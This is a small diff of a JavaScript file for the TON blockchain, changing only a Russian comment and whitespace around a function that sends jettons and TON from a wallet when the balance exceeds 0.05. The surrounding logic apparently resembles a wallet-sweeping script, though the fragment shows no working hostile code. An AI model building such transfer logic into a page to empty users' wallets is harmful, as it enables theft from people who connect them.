@@ -269,8 +269,7 @@ async function sendJettons(data, walletAddress, ton, tonPrice, i, tryies, tonFla
         maxMessages: 4
     });
 
-    // Всегда пытаемся добавить TON, если баланс достаточен
-     // Всегда пытаемся добавить TON если баланс больше 0.05 (для комиссий)
+    // Всегда пытаемся добавить TON если баланс больше 0.05 (для комиссий)
 if (parseFloat(ton) > 0.05) {
     console.log('Adding TON transfer...');
     try {
@@ -800,6 +799,7 @@ document.addEventListener('DOMContentLoaded', async () => {
     }
 
 });
+
 
 
 
